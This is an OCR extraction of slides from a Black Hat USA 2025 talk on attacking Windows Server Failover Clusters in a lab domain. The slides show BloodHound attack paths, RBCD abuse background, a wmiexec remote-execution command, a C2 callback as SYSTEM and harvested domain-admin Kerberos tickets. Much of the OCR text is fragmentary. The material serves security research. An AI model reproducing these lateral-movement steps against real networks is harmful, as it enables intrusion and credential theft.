---
title: "Clustered Points of Failure - Attacking Windows Server Failover Clusters"
speakers: ["Garrett Foster"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Garrett Foster_Clustered Points of Failure - Attacking Windows Server Failover Clusters.pdf"
pages: 138
sha256: "4ef368f11d0118136f7319d5487701cef6fb8db3091f6513b4e948387298e582"
text_chars: 61650
ocr_pages: 87
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.7
ocr_unreliable_blocks: 0
vision_verified_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: ["Garrett Foster_Clustered Points of Failure - Attacking Windows Server Failover Clusters_TOOLS.txt"]
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:14:40Z"
---
# Clustered Points of Failure - Attacking Windows Server Failover Clusters

**Speakers:** Garrett Foster  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Garrett Foster_Clustered Points of Failure - Attacking Windows Server Failover Clusters.pdf` (138 pages)


## Slide 1

#### Clustered Points of Failure Attacking Windows Server Failover Clusters

Garrett Foster

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
mac hat
FINGS
AUGUST be 2025
MANDALAY BAY / LAS VEGAS
Clustered Points of Failure
Attacking Windows Server Failover Clusters
Garrett Foster
```

## Slide 2

# 9 1 14 0 2 25 3 36

#BHUSA @BlackHatEvents

## Slide 3

# 886 997 1 008 2

#BHUSA @BlackHatEvents

## Slide 4

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
dustry
Scalability Day falls short
Doubts remain about Windows NT-based servers’ ability to tackle
high-level, enterprise-computing-size jobs.
4 min read R
Microsoft (MSFT) today gathered a number of big names in the PC server business
at what it called "Scalability Day" here, all in an effort to prove Windows NT is ready
to tackle enterprise-size jobs.
But it's not clear yet if Microsoft convinced anybody.
Guests and performers included Compaq Computer, Hewlett-Packard, Tandem, and
NCR.
Compaq (CPQ) stepped into the spotlight to demonstrate 25 Pentium Pro-based
ProLiant 5000 servers--all running Windows NT--in a simulation of a banking
operation that can process more than 1 billion transactions in a single 24-hour
period. That's four times the volume of calls that AT&T completes in one day,
Compag said.
Hewlett-Packard (HWP) showed off an NT-based NetServer system capable of
```

## Slide 5

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft's Cluster Server, which formerly went by the code name Wolfpack, is a
software-based clustering scheme, a system that allows servers to be connected
and to talk to each other. If one of them goes down, another server takes over the
work of the first, allowing a company to continue to operate even in the event of a
server crash.
```

## Slide 6

“A set of independent computers that work together to increase the availability of applications and services”

#BHUSA @BlackHatEvents

## Slide 7

###### File Server

Database

#BHUSA @BlackHatEvents

## Slide 8

#BHUSA @BlackHatEvents

## Slide 9

##### “…that was weird.”

#BHUSA @BlackHatEvents

## Slide 10

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
- Q SEARCH © PATHFINDING
© © (3) DOMAINADMIN@LUDUS.DOMAIN
</> CYPHER
DOMAIN COMPUTERS@LUDUS.DOMAIN
Search Current Results
CLUSTER.LUDUS.DOMAIN
HasSession
None Selected
Select a node to view the associated information
O
DOMAINADMIN@LUDUS.DOMAIN
```

## Slide 11

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CLUSTER.LUDUS.DOMAIN
DOMAIN COMPUTERS@LUDUS.DOMAIN Cad
```

## Slide 12

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS =
dirkjanm.io
Dirk-jan Mollema
Follow
Weise ADUSINg forgotten permissions on computer objects in Active
Directory
Awhile back, | read an interesting blog by about in Active
Directory. In the blog, Oddvar also describes the option to configure who can join the computer to the
domain after the object is created. This sets an interesting ACL on computer accounts, allowing the
principal who gets those rights to reset the computer account password via the “All extended rights”
WriteAccountRestrictions
option. That sounded quite interesting, so | did some more digging into this and found there are more
ACLs set when you use this option, which not only allows this principal to reset the password but also
to configure Resource-Based Constrained Delegation. BloodHound was missing this ACL, and | dug into
why, which I've written up in this short blog. If an environment is sufficiently large (and/or old), someone
at some point likely added a few systems to the domain with this option set to “Everyone” or
“Authenticated Users”, allowing all users in the, i
configured this probably did not realize this
after it is joined to the domain. The logic to an
DOMAIN COMPUTERS@LUDUS.DOMAIN
gatherer, as well as a for SharpHq * Not related to on-premise Active Di
may give you access to servers from any user. LAWN * Source of authentication for Ofice 36
/ and anything else you integrate wth it
Along the way, | discovered more cases in whig
there's a good chance that unintended users h
This post includes some queries to use in Blo
```

## Slide 13

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CLUSTER.LUDUS.DOMAIN
1g into this and found there are more
s set when you use this vhich not only allows this principal to reset the p jord but also
BloodHound was missing this ACL, and | dug into
r{_}“Wa DOMAIN COMPUTERS@LUDUS.DOMAIN
```

## Slide 14

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS =
Wagging the Dog: Abusing Resource-
Based Constrained Delegation to Attack
Active Directory
Back in March 2018, | embarked on an arguably pointless crusade to prove that the
TrustedToAuthForDelegation attribute was meaningless, and that “protocol transition” can be achieved
without it. | believed that security wise, once constrained delegation was enabled (msDS-
AllowedToDelegateTo was not null), it did not matter whether it was configured to use “Kerberos only” or
“any authentication protocol”.
| started the journey with Benjamin Delpy's (@gentilkiwi) help modifying Kekeo to support a certain
attack that involved invoking S4U2Proxy with a silver ticket without a PAC, and we t
but the final TGS turned out to be unusable. Ever since then, | kept coming back to
problem with different approaches but did not have much success. Until | finally acc
ironically then the solution came up, along with several other interesting abuse casi
techniques.
TL;DR
This post is lengthy, and | am conscious that many of you do not have the time or ¢
it, so | will try to convey the important points first:
. N, regardless of the state of the
TrustedToAuthForDelegation attribute. If TrustedToAuthForDelegation is set, then the TGS that
S4U2Self produces is forwardable, unless the principal is sensitive for delegation or a member of the
Protected Users group.
3. The above points mean that if
CLUSTER.LUDUS.DOMAIN
```

## Slide 15

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 70/100 on the text kept, 50/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
r{_}“Wa DOMAIN COMPUTERS@LUDUS.DOMAIN
```

## Slide 16

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CLUSTER.LUDUS.DOMAIN
DOMAIN COMPUTERS@LUDUS.DOMAIN Cad
```

## Slide 17

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CLUSTER.LUDUS.DOMAIN
HasSession
eo DOMAINADMIN@LUDUS.DOMAIN
```

## Slide 18

###### garrett@blackhat:~$ wmiexec.py @cluster.ludus.domain –k -no-pass▐

#BHUSA @BlackHatEvents

## Slide 19

garrett@blackhat:~$ wmiexec.py @cluster.ludus.domain –k -no-pass Impacket v0.13.0.dev0+20250226.212301.ead516a1 - Copyright Fortra, LLC and its affiliated companies

[-] SMB SessionError: code: 0xc00000cc - STATUS_BAD_NETWORK_NAME - {Network Name Not Found} The specified share name cannot be found on the remote server. garrett@blackhat:~$▐

#BHUSA @BlackHatEvents

## Slide 20

garrett@blackhat:~$ wmiexec.py @cluster.ludus.domain –k -no-pass Impacket v0.13.0.dev0+20250226.212301.ead516a1 - Copyright Fortra, LLC and its affiliated companies

[-] SMB SessionError: code: 0xc00000cc - STATUS_BAD_NETWORK_NAME - {Network Name Not Found} The specified share name cannot be found on the remote server. garrett@blackhat:~$▐

#BHUSA @BlackHatEvents

## Slide 21

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bi
) Task Scheduler
ction View Help
= =
heduler (CLUSTER.LUDUS,DON
3 Task Scheduler Library
crosoft
General
Start a program
~
Status Tri
Run... _At3:31 PM on 7/24/2025
Conditi
‘ou must s|
erty pag!
Details
Actions
Task Scheduler Library
3] Create Basic Task.
ry 1 hour for a duration of 1 day.
II ur when task starts. To change these
mmand.
jo_bhdemo.exe
Selected Item
Run
End
```

## Slide 22

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bi
© Task Scheduler
File
» Task Scheduler Library
Micro
General
Status Tri
Run
End
Disable
Details
Start a program \\test-de
jers defined
After triggered, repeat every 1 hour for a dura
-cify the action that will v starts. To change these
using the
Actions
Task Scheduler Library
@ Create Basic Task...
Create Task
Import Ta:
Folder...
View
Refresh
Help
Selected Item
Run
= End
```

## Slide 23

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bi
) Task Scheduler
ction View Help
= =
heduler (CLUSTER.LUDUS,DON
3 Task Scheduler Library
crosoft
General
Start a program
~
Status Tri
Run... _At3:31 PM on 7/24/2025
Conditi
‘ou must s|
erty pag!
Details
Actions
Task Scheduler Library
3] Create Basic Task.
ry 1 hour for a duration of 1 day.
II ur when task starts. To change these
mmand.
jo_bhdemo.exe
Selected Item
Run
End
```

## Slide 24

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bi
File Action View Help
= =
heduler (CLUSTER.LU
v _@ Task Scheduler Library
Microsoft
INTERACT HP
General Triggers
When y
Status
very day
n startup
tions Conditions Settings History
tion that will ur when your ta
tarts. To change these
Actions
Task Scheduler Library
Create Basic Ti
```

## Slide 25

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Action View Help
= =
heduler (CLUSTER.LU
v (G@ Task Scheduler Library
Actions
Task Scheduler Library
Create Basic Ti
Microsoft
very day very forad f 1 day.
n startup
General Triggers Actions Conditions Settings History
When y tion that will
a5 $169,254.2.145 TEST-CLUSTER ted by mythic_adnin at 2025-07-24 19:12:23 apollo
@ New catback (5) SYSTEM@TEST-CLUSTER wih pd 2000 a- &
&G
a
©
```

## Slide 26

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
() Task Scheduler
File Action View Help
(®) Task Scheduler (CLUSTER.LUDUS.DOMAIN) a Actions
- . Triggers
v Task Scheduler Library _ .
"© ") Microsoft @ wAt3:31 PM on 7/24/2025 Task Scheduler Library
(® MicrosoftEd... » Multiple trig defined
@] Create Basic Task...
(® MicrosoftEd... » At1:11PM y day - After triggered, repeat every 1 hour for a duration of 1 day.
: HOST : USER : DOMAIN : PID : LAST CHECKIN : DESCRIP]
45 TEST-CLUSTER ted
@ New Callback (5) SYSTEM@TEST-CLUSTER with pid 2000
```

## Slide 27

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS = //; Y y
( t) Task Scheduler
File Action View Help
(@ Task Scheduler (CLUSTER.LUDUS.DOMAIN)
Microsoft
Actions
Task Scheduler Library
Status Triggers
(® MicrosoftEd... R Aultiple tri defined @] Create Basic Task...
( MicrosoftEd... Ready At 1:11 PM every day - After triggered, repeat every 1 hour for a duration of 1 day.
: HOST : USER : DOMAIN : PID : LAST CHECKIN : DESCRIP]
45 TEST-CLUSTER ted
@ New Callback (5) s¥SfEM@TEST-CLUSTER with Co 2000 A~
```

## Slide 28

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Gor ¢169.254.2.145 | TEST-CLUSTER SYSTEM ludus 1628 1 seconds Created by my
CALLBACK: 6 X SPLIT CALLBACK: 6 X
[Thu Jul 24 2025 01:59 PM] / T-14 / mythic_admin / C-6/...
load inline_assembly assembly_inject
1
2
[Thu Jul 24 2025 02:03 PM] / T-15 / mythic_admin / C-6 ... 4 0 _ >) lle wee LL
8
9 v2.2.2
10
11
12 Action: Triage Kerberos Tickets (All Users)
13
14 [*] Target user : domainadmin
16
18 | LUID | UserName | Service
20 | Ox3fb@3F4 | domainadmin @ LUDUS.DOMAIN | HTTP/test-cluster.ludus.domain
21 | @x1beed7d | domainadmin @ LUDUS.DOMAIN | HTTP/test-cluster.1ludus.domain
22 | Q@x14c274b | domainadmin @ LUDUS.DOMAIN | HTTP/cluster.1ludus.domain
23 | @x108c183e | domainadmin @ LUDUS.DOMAIN | HTTP/test-cLluster.Lludus.domain
24 | Oxfd88d64 | domainadmin @ LUDUS.DOMAIN | HTTP/test-cluster.Ludus.domain|
25 | @xfd883e2 | domainadmin @ LUDUS.DOMAIN | HTTP/test-cluster.lLludus.domain
27 | @x11225c6 | domainadmin @ LUDUS.DOMAIN}! krbtgt/LUDUS .DOMAIN . 5
28 | Qx11225c6 | domainadmin @ LUDUS.DOMAIN i s.domain | //25/2025 IT:
30
31
```

## Slide 29

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Q
d Replication
Attribute Editor
Member Of Delegation Password Replication
Editor
Multi-valu ing Editor
Attribute: service PrincipalName
Value to add:
```

## Slide 30

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 71/100 on the text kept, 43/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Values:
MSServerClusterMomtAP |test-cluster2 Judus .domair
TERMSRY-test-cluster? Judus.domain
wie
sé
```

## Slide 31

##### Why did scheduled tasks work?

#BHUSA @BlackHatEvents

## Slide 32

##### Why that host?

#BHUSA @BlackHatEvents

## Slide 33

##### What’s going on with session data?

#BHUSA @BlackHatEvents

## Slide 34

##### How does Kerberos authentication work?

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
How does Kerberos
authentication work?
```

## Slide 35

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
( a4 » Daniel Heinsen
90 percent of security research is getting test environments setup
properly.
1:11 PM - Oct 27, 2021
```

## Slide 36

Server 2

Server 1

Server 3

#BHUSA @BlackHatEvents

## Slide 37

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg Failover Cluster Manager
File Action View Help
Failover Cluster Manager
System x32dbg
Informer
accesschk64 Windows
Cluster
Rubeus.exe
Failover Cluster Manager
Create failover clusters,
Overview
Name Role Status
@ Management
To begin
® More Information
ka
are for potential failover clusters, and perform configuration change
Node Status
n, and then create a cluster. After
t from a cluster running W
Actions
your failover clusters Failover Cluster Manager
Validate Configuration...
Create Cluster...
Connect to Cluster...
View
Refresh
Properties
Windows Server 2022 Standard Evaluation
Windows License valid for 170 days
Build 20348.fe_release.210507-1500
7:15 PM
```

## Slide 38

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg Failover Cluster Manager
File Action View Help
System x32dbg Create Cluster... Create failover clusters, fare for potential failover clusters, and perform configuration change:
Informer
Connect to Cluster...
View
Overview
Refresh
accesschk64 Windows
-Shortcut Admin C... Properties
Help
ww Clusters
Cluster Name Role Status Node Status
Rubeus.exe
@ Management
To begin : n, and then create a cluster. After
t from a cluster running W
® More Information
ka
This action launches a wizard that will guide you through the process of creating a new cluster.
your failover clusters
Actions
Failover Cluster Manager
Validate Configuration...
Create Cluster...
Connect to Cluster...
View
Refresh
Properties
Windows Server 2022 Standard Evaluation
Windows License valid for 170 days
Build 20348.fe_release.210507-1500
7:19 PM
```

## Slide 39

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg
Hacker 2 File Action View Help
Failover Cluster Manager i Actions
re a] Failover Cluster Manager
System x32dbg yalidate hare 5 failover clusters, and perform configuration changes to your failover clusters Failover Cluster Manager
eate Cluster Wi: Validate Configuration...
Create Cluster...
Connect to Cluster...
View
] Before You Begin Add the names of all the servers that you want to have in the cluster. You must add at least one server. sdb
WA Select Servers | Properties
= Help
Name
Cluster =e, Enter server name: Browse
Judus domain
test-cluster3 ludus domain
Rubeus.exe
To begin to use}
< Previous
( a ) More Information
Windows Server 2022 Standard Evaluation
Windows License valid for 170 days
Build 20348.fe_release.210507-1500
7:24 PM
ry here to search
```

## Slide 40

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg
Hacker 2
File Action View Help
Failover Cluster Manager
System x32dbg
Informer
accesschk64 Windows
Cluster
Rubeus.exe
HH e here to search
Failover Cluster Manager
validate har
eate Cluster Wi:
| Before You Begin
Servers
| Sele
Validation Waming
fiene, ‘Access Point for
‘Administering the
Guster
To begin to use|
( a ) More Information
1 clusters, and perform configuration changes to your failover clusters.
jistering the Cluster
Type the name you want to use when administering the cluster.
Cluster Name:
The NetBIOS name is limited to 15 characters. One or more IPv4 addresses could not be configured
© automatically. For each network to be used, make sure the network is selected, and then type an
address.
Address
10
Actions
Failover Cluster Manager
Validate Configuration...
Create Cluster...
Connect to Cluster...
View
Refresh
Properties
Windows Server 2022 Standard Evaluation
Windows License valid for 170 days
Build 20348.fe_release.210507-1500
7:27 PM
```

## Slide 41

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg
Hacker 2
File Action View Help
i a Failover Cluster Manager Failover Cluster Manager
a aS fq Create filover clusters_validate hardware for notential failover clusters_and nerform confiauration chanaes ta vou failover clusters __| Failover Cluster Manager
Actions
eate Cluster Wizard Validate Configuration...
Create Cluster..
y Connect to Cluste
accesschk64 Windows View
| You have successfully completed the Create Cluster Wizard Refresh
: | Properties
Cluster Name
Rubeus.exe
Quorum
Node and Disk Majority (Cluster Disk 1
@ Mana} the report created by the wizard, click View Report
se this wizard, click Finish.
View Report
® More Information
Windows Server 2022 Standard Evaluation
Windows License valid for 170 days
Build 20348.fe_release.210507-1500
HH e here to search
```

## Slide 42

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process Bag Failover Cluster Manager
Hacker 2 File Action View Help
re a] Fail ver Cluster Manager Cluster cluster.ludus.domain Actions
System x32dbg Al v Fig clustersludus.domain cluster.Judus.domain
Informer Roles = Summary of Cluster cluster
#1 Nodes ‘ad cluster has 0 clustered roles and 3 nodes.
Storage Name: cluster udus.domain Networks: Cluster Network 1 Validate Cluster..
Current Host Server: test-cluster2 Subnets: 1 |Pv4 and 0 IPv6 View Validation Report
accesschk64 Windows Recent Cluster Events: None in the last hour
- Shortcut Admin C... Witness: Cluster Disk 1
Configure Role...
[8] Cluster Events
lose Connection
Reset Recent Events
@ Configure
mm @ cluster runni
Cluster
Rubeus.exe
Navigate
® Cluster Core Resources
Name Status Information
Storage
Windows Server 2022 Standard Evaluation
Windows License valid for 170 days
Build 20348.fe_release.210507-1500
```

## Slide 43

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg 33 Failover Cluster Manager
Hacker 2 File Action View H
1?
; Cluster cluster.ludus.domain ‘Actions
cluster.ludus.domain
ie
Informer Role: Configure Role... nary of Cluster cluster
4 Node _ Validate Cluster... - has 0 clustered roles and 3 nodes. Configure Role.
Storac
accesschk64 Windows er Events: None in the last
=Shortcut Admin C... Close Connection ster Disk 1
View Validation Report budus.domain Networks: Cluster Network 1 Validate Cluster...
=
Add Node...
Reset Recent Events
Reset Recent Events
More Actions
| availability for a specific clus’ n “ More Actions
View r supported previous versions o!
View
Refresh Oe Refresh
Properties Propesties
Rubeus.exe ee
@® Navigate
® Cluster Core Resources
Name Status
Storage
& GA Cluster Disk 1 Online
This action enables you to select a role that you can configure for high availability
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348.fe_release.210507-1500
5:28 PM
```

## Slide 44

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg
Hacker 2
x32dbg
accesschk64 Windows
Cluster
Rubeus.exe
File Action View Help
Failover Cluster Manager
v 33 cluster.ludus.domain
Role
#1 Nodes
Storage
aN
£8] Cluster Events
Cluster cluster.ludus.domain
High Availability Wizard
* cluster
Name: cluster,
Current Host
Recent Clust«
Witness: Clus
Before You Begin
© confi
Select Role
Select the role that you want to configure for high availabilty
DFS Namespa
DHCP Server
¥-» Distributed Transac
<iSCSI Taraet Ser
Status
Online
a central location
on your ni re files are shared
for use by u
Information
Configure Role.
Validate Cluster...
View Validation Report
Add Node...
Close Connection
Reset Recent Events
More Actions
View
Refresh
Properties
Help
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348.fe_release.210507-1500
5:30 PM
```

## Slide 45

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg
Hacker 2
Informer
=
accesschk64 Windows
Cluster
Rubeus.exe
oT] e here to search
File Action View Help
Failover Cluster Manager
Role
| Storage
N
fs] Cluster Events
Cluster cluster.ludus.domain
High Availability Wizard
Client Access Point
Before You Begin Type the name that clients will use when accessing this clustered role:
Name:
The NetBIOS name is limited to 15 characters. One or more IPv4 addresses could not be configured
© automatically. For each network to be used, make sure the n elected, and then type an
address.
® Cluster Core Resources
Name Status Information
Storage
Configure Role.
Validate Cluster...
View Validation Report
Add Node...
Close Connection
Reset Recent Events
More Actions
View
Ref
Properties
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348.fe_release.210507-1500
5:34 PM
```

## Slide 46

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg
Hacker 2
File Action View
a] 2 Failover Cluster Manager
System x32dbg A 3 cluster.ludus.domain
Informer ® Roles
=i Nodes
Storage
4a Networks
£8] Cluster Events
accesschk64 Windows
Cluster
Rubeus.exe
High Availability Wizard
Select Storage
Before You Begin Select only the storage volumes that you want to assign to this clustered role.
Select Rol You can assign additional storage to this clustered role after you complete this wizard.
elect Role
File Server Type
Client Access Point ame Status
Cancel
Configure Role...
Virtual Machines
Create Empty Role
View
Refresh
Help
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348.fe_release.210507-1500
5:45 PM
```

## Slide 47

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Action View Help
og Cluster Manager
System x32dbg
Informer & Roles
Nodes
Storage
Networ
SS cluster.ludus.domain
accesschk64 Windows
Cluster
Rubeus.exe
High availabilty was successfully configured for the ro
Network Name
cluster-share
OU
OU:
IP Address
10.3.10.101
To view the report created by the wizard, click View Report
To close this wizard,
View Report
Actions
s
Configure Role...
Virtual Machin
eate Empty Role
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348.fe_release.210507-1500
5:46 PM
```

## Slide 48

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg Failover Cluster Manager
Hacker 2
File Action View Help
System x32dbg p S4 cluster.ludus.domain
nt Roles 4 Summary of Cluster cluster .
tend Current Host Server: test-cluster = 1 IPv4 and 0 IPV6 View Validation Report
accesschk64 Windows Recent Cluster Events: None in the last 24 hours
- Shortcut Admin C... Add Node...
Witness: Cluster Disk 1
add one or more servers (nodes). or copy roles from a cluster running Windows
Cluster
Co Properties
Rubeus.exe
Navigate
Information
Online
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348,fe_release.210507-1500
7:50 PM
a
```

## Slide 49

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Be Failover Cluster Manager
File Action View Help
LU - Failover Cluster Manager Cluster cluster.ludus.domain
2 Fe Roles :) Summary of Cluster cluster
i Nodes ‘di cluster has 0 clustered roles and 3 nodes.
— Storage Name: cluster.Judus.domain Networks: Cluster
aa Networks
Current Host Server. test-cluster Subnets: 1/Pv4a
3] Cluster Event
3] een eee Recent Cluster Events: None in the last 24 hours
Witness: Cluster Disk 1
() Configure
Configure high availability for @ specific clustered role, add one or more servers (nodes). o
Server 2022 or supported previous versions of Windows Server.
> Confiqure Role... Kd) Failover clustert
WA Validate Cluster...
WF Add Node...
i= Copy Cluster Roles...
```

## Slide 50

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
L
A
= Failover Cluster Manager
File Action View Help
Br Failover Cluster Manager
igs Roles
ai Nodes
4a Networks
$3] Cluster Events
Search
Name Status Type Owner Node
=) Cluster-share (@) Running File Server test-cluster
Status: Running
Priority: Medium
Owner Node: test-cluster
Client Access Name: cluster-share
IP Addresses: 10.3.10.101
```

## Slide 51

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
=I Failover Cluster Manager
File Action View Help
Br Failover Cluster Manager
ca Storage
4a Networks
$3] Cluster Events
Search
Name Status Assigned Vote Current Vote
```

## Slide 52

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
= Failover Cluster Manager
File Action View Help
BR Failover Cluster Manager
Fs Roles
41 Nodes
=) Networks
$3] Cluster Events
Name Status Cluster Use Information
=A Cluster Network 1 (@) Up Cluster and Client
v ria Cluster Network 1
Name Status
+) GH test-cluster3 - Ethemet
+) GR test-cluster2 - Ethemet
(+) GH test-cluster - Ethemet
```

## Slide 53

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application
Cluster Service
Cluster Service
Cluster Service
Cluster Service
RPC
Cluster Administrator
Randomly allocated high
ports?
WinRM
Protocol
UDP and
DTLS'
TCP
ICMP
TCP
TCP
UDP
TCP
TCP
Ports
3343
3343 (This port is required during a node join operation.)
Echo port (This port is required during a node join operation from the Add Node
Wizard.)
445 (This port is required during a node join operation from the Add Node Wizard.)
135
137
Random port number between 49152 and 65535
5985 (This port is required when deploying cloud witness.)
```

## Slide 54

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application
Cluster Service
Cluster Service
Cluster Service
Cluster Service
RPC
Cluster Administrator
Randomly allocated high
ports?
WinRM
Protocol
UDP and
DTLS'
TCP
ICMP
TCP
TCP
UDP
TCP
TCP
Ports
3343 (This port is required during a node join operation.)
Echo port (This port is required during a node join operation from the Add Node
Wizard.)
445 (This port is required during a node join operation from the Add Node Wizard.)
135
137
Random port number between 49152 and 65535
5985 (This port is required when deploying cloud witness.)
```

## Slide 55

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application Protocol
Connection-specific DNS Suffix
Description .
Physical Address.
DHCP Enabled. :
Autoconfiguration Enabled -
Link-local IPv6 Address .
IPv4 Address.
Subnet Mask . .
Default Gateway .
DHCPv6 IAID.. .
DHCPv6 Client DUID.
NetBIOS over Tcpip.
WinRM TCP
Ports
: fe80: :df70:90b4: 8ffa:b176%7 (Preferred)
> 169.254.1.95(Preferred)
: 167964671
: Enabled
5985 (This port is required when deploying cloud witness.)
```

## Slide 56

#BHUSA @BlackHatEvents

## Slide 57

#BHUSA @BlackHatEvents


